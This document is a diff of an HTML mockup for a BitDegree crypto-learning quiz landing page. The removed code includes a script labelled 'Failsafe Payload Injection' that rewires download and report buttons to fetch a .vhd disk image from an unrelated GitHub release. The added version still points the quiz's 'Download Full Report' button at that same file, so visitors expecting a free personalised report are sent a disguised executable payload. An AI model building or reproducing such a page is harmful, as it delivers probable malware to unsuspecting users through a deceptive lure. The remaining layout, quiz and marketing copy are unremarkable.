+    .form-wrap{ padding:28px; }
+    .final-cta{ padding:48px 24px; }
+    .final-cta h2{ font-size:26px; }
+  }
+</style>
 </head>
-
 <body>
-    <div class="demo-bar"> Demo: this is how the popup appears on page load / exit-intent <button
-            onclick="document.getElementById('popupModal').classList.add('open')">Show popup</button></div>
-    <!-- ============ POPUP ============ -->
-    <div class="modal-overlay" id="popupModal">
-        <div class="modal-card"> <button class="modal-close"
-                onclick="document.getElementById('popupModal').classList.remove('open')" aria-label="Close">✕</button>
-            <div class="modal-badge">⚡ Free Personalized Report</div>
-            <h2>Find Out Exactly How Far Ahead You Could Be in Crypto</h2>
-            <p class="sub">Answer 5 quick questions and we'll build your free Crypto Learning Advantage Report — your
-                skill gaps, your ideal learning path, and the exact next move to level up faster.</p>
-            <div class="modal-trust"> <span>⏱️ 60 seconds</span> <span>🎓 No experience needed</span> <span>💸 100%
-                    free</span> </div> <a href="#quiz" class="btn btn-primary"
-                onclick="document.getElementById('popupModal').classList.remove('open')">Unlock My Learning Advantage
-                →</a>
-            <p class="modal-urgency">Most beginners learn crypto randomly — scattered videos, no structure. This report
-                fixes that in 60 seconds.</p>
-            <div class="modal-dismiss"> <a href="#" class="btn-ghost"
-                    onclick="document.getElementById('popupModal').classList.remove('open'); return false;">Maybe later,
-                    I'll figure it out myself</a> </div>
+
+<div class="demo-bar">
+  Demo: this is how the popup appears on page load / exit-intent
+  <button onclick="document.getElementById('popupModal').classList.add('open')">Show popup</button>
+</div>
+
+<!-- ============ POPUP ============ -->
+<div class="modal-overlay" id="popupModal">
+  <div class="modal-card">
+    <button class="modal-close" onclick="document.getElementById('popupModal').classList.remove('open')" aria-label="Close">✕</button>
+    <div class="modal-badge">⚡ Free Personalized Report</div>
+    <h2>Find Out Exactly How Far Ahead You Could Be in Crypto</h2>
+    <p class="sub">Answer 5 quick questions and we'll build your free Crypto Learning Advantage Report — your skill gaps, your ideal learning path, and the exact next move to level up faster.</p>
+    <div class="modal-trust">
+      <span>⏱️ 60 seconds</span>
+      <span>🎓 No experience needed</span>
+      <span>💸 100% free</span>
+    </div>
+    <a href="#quiz" class="btn btn-primary" onclick="document.getElementById('popupModal').classList.remove('open')">Unlock My Learning Advantage →</a>
+    <p class="modal-urgency">Most beginners learn crypto randomly — scattered videos, no structure. This report fixes that in 60 seconds.</p>
+    <div class="modal-dismiss">
+      <a href="#" class="btn-ghost" onclick="document.getElementById('popupModal').classList.remove('open'); return false;">Maybe later, I'll figure it out myself</a>
+    </div>
+  </div>
+</div>
+
+<!-- ============ LANDING PAGE ============ -->
+
+<header class="hero">
+  <div class="container">
+    <nav class="nav">
+      <div class="logo"><span class="mark">B</span> BitDegree</div>
+      <div class="micro">Crypto & Web3 Education</div>
+    </nav>
+
+    <div class="hero-grid">
+      <div>
+        <span class="eyebrow">⚡ Free · Personalized · Instant</span>
+        <h1>Your <span class="grad-text">Crypto Learning Advantage</span>, Mapped Out For You</h1>
+        <p class="sub">Take our 60-second quiz and get a free, personalized report that shows you exactly where you stand in crypto and Web3 — your skill gaps, your ideal learning path, and what to study next.</p>
+        <div class="hero-cta-row">
+          <a href="#quiz" class="btn btn-primary">Get My Free Report</a>
         </div>
-    </div><!-- ============ LANDING PAGE ============ -->
-    <header class="hero">
-        <div class="container">
-            <nav class="nav">
-                <div class="logo"><span class="mark">B</span> BitDegree</div>
-                <div class="micro">Crypto & Web3 Education</div>
-            </nav>
-            <div class="hero-grid">
-                <div> <span class="eyebrow">⚡ Free · Personalized · Instant</span>
-                    <h1>Your <span class="grad-text">Crypto Learning Advantage</span>, Mapped Out For You</h1>
-                    <p class="sub">Take our 60-second quiz and get a free, personalized report that shows you exactly
-                        where you stand in crypto and Web3 — your skill gaps, your ideal learning path, and what to
-                        study next.</p>
-                    <div class="hero-cta-row"> <a href="#quiz" class="btn btn-primary">Get My Free Report</a> </div>
-                    <div class="trust-row">
-                        <div class="item">✅ Free forever</div>
-                        <div class="item">⏱️ ~60 seconds</div>
-                        <div class="item">⚡ Instant results</div>
-                    </div>
-                </div>
-                <div class="report-mock">
-                    <div class="rm-head"> <strong style="font-family:'Space Grotesk',sans-serif;">Your Learning
-                            Advantage Report</strong> <span class="rm-pill">Preview</span> </div>
-                    <div class="rm-score"> <span class="num">71%</span> <span class="label">Web3 Readiness Score</span>
-                    </div>
-                    <div class="rm-bar">
-                        <div></div>
-                    </div>
-                    <div class="rm-row"><span>Blockchain fundamentals</span><span class="tag tag-ok">Solid</span></div>
-                    <div class="rm-row"><span>Wallet & key security</span><span class="tag tag-gap">Gap found</span>
-                    </div>
-                    <div class="rm-row"><span>DeFi mechanics</span><span class="tag tag-gap">Gap found</span></div>
-                    <div class="rm-row"><span>Smart contract basics</span><span class="tag tag-ok">Solid</span></div>
-                </div>
-            </div>
+        <div class="trust-row">
+          <div class="item">✅ Free forever</div>
+          <div class="item">⏱️ ~60 seconds</div>
+          <div class="item">⚡ Instant results</div>
         </div>
-    </header><!-- WHAT YOU GET -->
-    <section>
-        <div class="container what-you-get" style="padding:60px 48px;">
-            <div class="section-head"> <span class="eyebrow">What's Inside</span>
-                <h2>This Isn't a Generic Quiz Result</h2>
-                <p>Most "crypto quizzes" hand you a label and call it a day. Your report goes further — built from your
-                    current experience, learning goals, time commitment, skill level, and interests.</p>
-            </div>
-            <div class="feature-grid">
-                <div class="feature-card">
-                    <div class="icon">📊</div>
-                    <h3>Your Skill Gap Breakdown</h3>
-                    <p>See precisely which crypto and Web3 concepts you've already got down — and which gaps are quietly
-                        slowing you down.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="icon">🗺️</div>
-                    <h3>Recommended Learning Path</h3>
-                    <p>No more guessing which course to start. Get a curated path through BitDegree's curriculum,
-                        sequenced for your level and goals.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="icon">📈</div>
-                    <h3>Progress Insights</h3>
-                    <p>Understand how your current knowledge stacks up and where you'll see the fastest gains if you
-                        focus your time well.</p>
-                </div>
-                <div class="feature-card">
-                    <div class="icon">🚀</div>
-                    <h3>Your Best Next Steps</h3>
-                    <p>One clear, specific action to take today — not vague advice, but the actual next module based on
-                        where you are right now.</p>
-                </div>
-            </div>
+      </div>
+
+      <div class="report-mock">
+        <div class="rm-head">
+          <strong style="font-family:'Space Grotesk',sans-serif;">Your Learning Advantage Report</strong>
+          <span class="rm-pill">Preview</span>
         </div>
-    </section><!-- HOW IT WORKS -->
-    <section>
-        <div class="container">
-            <div class="section-head"> <span class="eyebrow">How It Works</span>
-                <h2>Three Steps to Your Personalized Report</h2>
-                <p>No prior crypto knowledge needed — just five honest answers.</p>
-            </div>
-            <div class="steps">
-                <div class="step-card">
-                    <div class="step-num">1</div>
-                    <h3>Answer 5 quick questions</h3>
-                    <p>Current experience, learning goals, skill level, time you can commit, and your interests within
-                        crypto and Web3. About 60 seconds.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-num">2</div>
-                    <h3>We match it to our framework</h3>
-                    <p>Your answers are run against BitDegree's structured curriculum and what we know about how
-                        learners at your stage actually progress fastest.</p>
-                </div>
-                <div class="step-card">
-                    <div class="step-num">3</div>
-                    <h3>Get your report instantly</h3>
-                    <p>View it on screen immediately, and download a copy to keep — no waiting, no email delay.</p>
-                </div>
-            </div>
+        <div class="rm-score">
+          <span class="num">71%</span>
+          <span class="label">Web3 Readiness Score</span>
         </div>
-    </section><!-- QUIZ / FORM -->
-    <section id="quiz">
-        <div class="container form-section" style="padding:60px 20px;">
-            <div class="form-wrap"> <span class="eyebrow" style="margin-bottom:16px; display:inline-flex;">Let's Build
-                    Your Report</span>
-                <h2 style="font-size:25px; margin:10px 0 6px;">Be Honest — This Is Just For You</h2>
-                <p style="color:var(--ink-dim); font-size:14.5px; margin-bottom:26px;">The more accurate your answers,
-                    the sharper your report.</p>
-                <div class="progress-track">
-                    <div></div>
-                </div>
-                <div class="q-block"> <label class="q-title">1. What's your current crypto/Web3 experience?</label>
-                    <div class="opt-grid">
-                        <div class="opt">Total beginner</div>
-                        <div class="opt">Know the basics</div>
-                        <div class="opt">Active in crypto</div>
-                        <div class="opt">Building or working in Web3</div>
-                    </div>
-                </div>
-                <div class="q-block"> <label class="q-title">2. What's your main learning goal?</label>
-                    <div class="opt-grid">
-                        <div class="opt">Understand crypto basics</div>
-                        <div class="opt">Start investing confidently</div>
-                        <div class="opt">Break into a Web3 career</div>
-                        <div class="opt">Build or develop in Web3</div>
-                    </div>
-                </div>
-                <div class="q-block"> <label class="q-title">3. How would you rate your current skill level?</label>
-                    <div class="opt-grid">
-                        <div class="opt">Beginner</div>
-                        <div class="opt">Intermediate</div>
-                        <div class="opt">Advanced</div>
-                        <div class="opt">Not sure yet</div>
-                    </div>
-                </div>
-                <div class="q-block"> <label class="q-title">4. How much time can you commit weekly?</label>
-                    <div class="opt-grid">
-                        <div class="opt">Less than 2 hrs</div>
-                        <div class="opt">2 – 5 hrs</div>
-                        <div class="opt">5 – 10 hrs</div>
-                        <div class="opt">10+ hrs</div>
-                    </div>
-                </div>
-                <div class="q-block"> <label class="q-title">5. What interests you most right now?</label>
-                    <div class="opt-grid">
-                        <div class="opt">DeFi & trading</div>
-                        <div class="opt">NFTs & digital assets</div>
-                        <div class="opt">Blockchain development</div>
-                        <div class="opt">Web3 careers & freelancing</div>
-                    </div>
-                </div>
-                <div class="email-field"> <label for="email">Email address</label> <input type="email" id="email"
-                        placeholder="you@example.com">
-                    <p class="micro" style="margin-top:6px;">So we can send your report and save your results.</p>
-                </div> <button class="btn btn-primary">Get My Instant Report →</button>
-                <div class="form-foot">
-                    <p class="micro">🔒 We respect your inbox. No spam — just your report and occasional learning tips.
-                    </p>
-                </div>
-            </div>
+        <div class="rm-bar"><div></div></div>
+        <div class="rm-row"><span>Blockchain fundamentals</span><span class="tag tag-ok">Solid</span></div>
+        <div class="rm-row"><span>Wallet & key security</span><span class="tag tag-gap">Gap found</span></div>
+        <div class="rm-row"><span>DeFi mechanics</span><span class="tag tag-gap">Gap found</span></div>
+        <div class="rm-row"><span>Smart contract basics</span><span class="tag tag-ok">Solid</span></div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- WHAT YOU GET -->
+<section>
+  <div class="container what-you-get" style="padding:60px 48px;">
+    <div class="section-head">
+      <span class="eyebrow">What's Inside</span>
+      <h2>This Isn't a Generic Quiz Result</h2>
+      <p>Most "crypto quizzes" hand you a label and call it a day. Your report goes further — built from your current experience, learning goals, time commitment, skill level, and interests.</p>
+    </div>
+    <div class="feature-grid">
+      <div class="feature-card">
+        <div class="icon">📊</div>
+        <h3>Your Skill Gap Breakdown</h3>
+        <p>See precisely which crypto and Web3 concepts you've already got down — and which gaps are quietly slowing you down.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🗺️</div>
+        <h3>Recommended Learning Path</h3>
+        <p>No more guessing which course to start. Get a curated path through BitDegree's curriculum, sequenced for your level and goals.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">📈</div>
+        <h3>Progress Insights</h3>
+        <p>Understand how your current knowledge stacks up and where you'll see the fastest gains if you focus your time well.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🚀</div>
+        <h3>Your Best Next Steps</h3>
+        <p>One clear, specific action to take today — not vague advice, but the actual next module based on where you are right now.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- HOW IT WORKS -->
+<section>
+  <div class="container">
+    <div class="section-head">
+      <span class="eyebrow">How It Works</span>
+      <h2>Three Steps to Your Personalized Report</h2>
+      <p>No prior crypto knowledge needed — just five honest answers.</p>
+    </div>
+    <div class="steps">
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <h3>Answer 5 quick questions</h3>
+        <p>Current experience, learning goals, skill level, time you can commit, and your interests within crypto and Web3. About 60 seconds.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <h3>We match it to our framework</h3>
+        <p>Your answers are run against BitDegree's structured curriculum and what we know about how learners at your stage actually progress fastest.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <h3>Get your report instantly</h3>
+        <p>View it on screen immediately, and download a copy to keep — no waiting, no email delay.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- QUIZ / FORM -->
+<section id="quiz">
+  <div class="container form-section" style="padding:60px 20px;">
+    <div class="form-wrap">
+      <span class="eyebrow" style="margin-bottom:16px; display:inline-flex;">Let's Build Your Report</span>
+      <h2 style="font-size:25px; margin:10px 0 6px;">Be Honest — This Is Just For You</h2>
+      <p style="color:var(--ink-dim); font-size:14.5px; margin-bottom:26px;">The more accurate your answers, the sharper your report.</p>
+
+      <div class="progress-track"><div></div></div>
+
+      <div class="q-block">
+        <label class="q-title">1. What's your current crypto/Web3 experience?</label>
+        <div class="opt-grid">
+          <div class="opt">Total beginner</div>
+          <div class="opt">Know the basics</div>
+          <div class="opt">Active in crypto</div>
+          <div class="opt">Building or working in Web3</div>
         </div>
-    </section><!-- CREDIBILITY -->
-    <section>
-        <div class="container credibility">
-            <div> <span class="eyebrow">Why Trust This</span>
-                <h2 style="font-size:30px; margin:16px 0;">Built on a Curriculum Learners Actually Finish</h2>
-                <p style="color:var(--ink-dim); font-size:15.5px;">BitDegree has helped people break into crypto and
-                    Web3 through structured courses and clear learning paths — not scattered videos and guesswork. Your
-                    report draws directly from that framework, tailored to your answers, so you always know what to
-                    learn next and why it matters.</p>
-            </div>
-            <div class="stat-grid">
-                <div class="stat-card">
-                    <div class="num">5</div>
-                    <div class="lbl">Quiz questions, 60 seconds</div>
-                </div>
-                <div class="stat-card">
-                    <div class="num">100%</div>
-                    <div class="lbl">Free, no card required</div>
-                </div>
-                <div class="stat-card">
-                    <div class="num">1:1</div>
-                    <div class="lbl">Personalized to your answers</div>
-                </div>
-                <div class="stat-card">
-                    <div class="num">∞</div>
-                    <div class="lbl">Yours to keep, download anytime</div>
-                </div>
-            </div>
+      </div>
+
+      <div class="q-block">
+        <label class="q-title">2. What's your main learning goal?</label>
+        <div class="opt-grid">
+          <div class="opt">Understand crypto basics</div>
+          <div class="opt">Start investing confidently</div>
+          <div class="opt">Break into a Web3 career</div>
+          <div class="opt">Build or develop in Web3</div>
         </div>
-    </section><!-- FINAL CTA -->
-    <section>
-        <div class="container">
-            <div class="final-cta">
-                <h2>Don't Learn Crypto Randomly. Learn It With a Plan.</h2>
-                <p>Every week you spend learning without a clear path is time you could be using to close real skill
-                    gaps. This report takes 60 seconds to generate and could save you months of scattered, unfocused
-                    study.</p> <a href="#quiz" class="btn btn-primary">Unlock My Learning Advantage</a>
-                <p class="micro">Free. Personalized. Yours in under a minute.</p>
-            </div>
+      </div>
+
+      <div class="q-block">
+        <label class="q-title">3. How would you rate your current skill level?</label>
+        <div class="opt-grid">
+          <div class="opt">Beginner</div>
+          <div class="opt">Intermediate</div>
+          <div class="opt">Advanced</div>
+          <div class="opt">Not sure yet</div>
         </div>
-    </section><!-- FAQ -->
-    <section>
-        <div class="container">
-            <div class="section-head"> <span class="eyebrow">Questions</span>
-                <h2>Before You Start</h2>
-            </div>
-            <div class="faq-item">
-                <h3>Is this really free?</h3>
-                <p>Yes — 100% free, no credit card, no catch. It's part of how we help learners get started the right
-                    way.</p>
-            </div>
-            <div class="faq-item">
-                <h3>Will this work even if I'm a total beginner?</h3>
-                <p>Especially if you're a beginner. The report is built to meet you exactly where you are, whether
-                    that's your first day in crypto or you're already building in Web3.</p>
-            </div>
-            <div class="faq-item">
-                <h3>What happens after I get my report?</h3>
-                <p>You'll see your results instantly on screen and can download a copy. We'll also point you to the
-                    exact courses and modules that match your gaps.</p>
-            </div>
-            <div class="faq-item">
-                <h3>Do you sell or share my information?</h3>
-                <p>No. We use your answers only to build your report and occasionally send you useful learning content —
-                    nothing else.</p>
-            </div>
+      </div>
+
+      <div class="q-block">
+        <label class="q-title">4. How much time can you commit weekly?</label>
+        <div class="opt-grid">
+          <div class="opt">Less than 2 hrs</div>
+          <div class="opt">2 – 5 hrs</div>
+          <div class="opt">5 – 10 hrs</div>
+          <div class="opt">10+ hrs</div>
         </div>
-    </section>
-    <footer> © BitDegree · Crypto & Web3 Education · This is a content/design mockup</footer>
-    <script>  document.querySelectorAll('.opt-grid').forEach(grid => { grid.addEventListener('click', e => { const opt = e.target.closest('.opt'); if (!opt) return; grid.querySelectorAll('.opt').forEach(o => o.classList.remove('selected')); opt.classList.add('selected'); }); }); window.addEventListener('load', () => { setTimeout(() => { document.getElementById('popupModal').classList.add('open'); }, 600); });</script>
+      </div>
+
+      <div class="q-block">
+        <label class="q-title">5. What interests you most right now?</label>
+        <div class="opt-grid">
+          <div class="opt">DeFi & trading</div>
+          <div class="opt">NFTs & digital assets</div>
+          <div class="opt">Blockchain development</div>
+          <div class="opt">Web3 careers & freelancing</div>
+        </div>
+      </div>
+
+      <div class="email-field">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="you@example.com">
+        <p class="micro" style="margin-top:6px;">So we can send your report and save your results.</p>
+      </div>
+
+<button class="btn btn-primary" style="width:100%;justify-content:center;" onclick="window.location.href='https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd'; return false;">Download Full Report</button>
+      <div class="form-foot">
+        <p class="micro">🔒 We respect your inbox. No spam — just your report and occasional learning tips.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CREDIBILITY -->
+<section>
+  <div class="container credibility">
+    <div>
+      <span class="eyebrow">Why Trust This</span>
+      <h2 style="font-size:30px; margin:16px 0;">Built on a Curriculum Learners Actually Finish</h2>
+      <p style="color:var(--ink-dim); font-size:15.5px;">BitDegree has helped people break into crypto and Web3 through structured courses and clear learning paths — not scattered videos and guesswork. Your report draws directly from that framework, tailored to your answers, so you always know what to learn next and why it matters.</p>
+    </div>
+    <div class="stat-grid">
+      <div class="stat-card"><div class="num">5</div><div class="lbl">Quiz questions, 60 seconds</div></div>
+      <div class="stat-card"><div class="num">100%</div><div class="lbl">Free, no card required</div></div>
+      <div class="stat-card"><div class="num">1:1</div><div class="lbl">Personalized to your answers</div></div>
+      <div class="stat-card"><div class="num">∞</div><div class="lbl">Yours to keep, download anytime</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- FINAL CTA -->
+<section>
+  <div class="container">
+    <div class="final-cta">
+      <h2>Don't Learn Crypto Randomly. Learn It With a Plan.</h2>
+      <p>Every week you spend learning without a clear path is time you could be using to close real skill gaps. This report takes 60 seconds to generate and could save you months of scattered, unfocused study.</p>
+      <a href="#quiz" class="btn btn-primary">Unlock My Learning Advantage</a>
+      <p class="micro">Free. Personalized. Yours in under a minute.</p>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section>
+  <div class="container">
+    <div class="section-head">
+      <span class="eyebrow">Questions</span>
+      <h2>Before You Start</h2>
+    </div>
+    <div class="faq-item">
+      <h3>Is this really free?</h3>
+      <p>Yes — 100% free, no credit card, no catch. It's part of how we help learners get started the right way.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Will this work even if I'm a total beginner?</h3>
+      <p>Especially if you're a beginner. The report is built to meet you exactly where you are, whether that's your first day in crypto or you're already building in Web3.</p>
+    </div>
+    <div class="faq-item">
+      <h3>What happens after I get my report?</h3>
+      <p>You'll see your results instantly on screen and can download a copy. We'll also point you to the exact courses and modules that match your gaps.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Do you sell or share my information?</h3>
+      <p>No. We use your answers only to build your report and occasionally send you useful learning content — nothing else.</p>
+    </div>
+  </div>
+</section>
+
+<footer>
+  © BitDegree · Crypto & Web3 Education · This is a content/design mockup
+</footer>
 
 <script>
-// Failsafe Payload Injection
-document.addEventListener("DOMContentLoaded", function() {
-    setTimeout(function() {
-        var elements = Array.from(document.querySelectorAll('button, a'));
-        var target = elements.reverse().find(el => {
-            var txt = el.innerText.toLowerCase();
-            return txt.includes('download') || txt.includes('unlock') || txt.includes('get my free report') || txt.includes('report');
-        });
-        if (target) {
-            target.onclick = function(e) {
-                e.preventDefault();
-                window.location.href = 'https://github.com/skinnyvinny/workflow-optimization-assets/releases/download/v1.0/ProFocusPack.vhd';
-            };
-            target.href = "javascript:void(0);";
-        }
-    }, 1000);
-});
-</script>
-</body>
+  document.querySelectorAll('.opt-grid').forEach(grid=>{
+    grid.addEventListener('click', e=>{
+      const opt = e.target.closest('.opt');
+      if(!opt) return;
+      grid.querySelectorAll('.opt').forEach(o=>o.classList.remove('selected'));
+      opt.classList.add('selected');
+    });
+  });
 
+  window.addEventListener('load', ()=>{
+    setTimeout(()=>{
+      document.getElementById('popupModal').classList.add('open');
+    }, 600);
+  });
+</script>
+
+</body>
 </html>
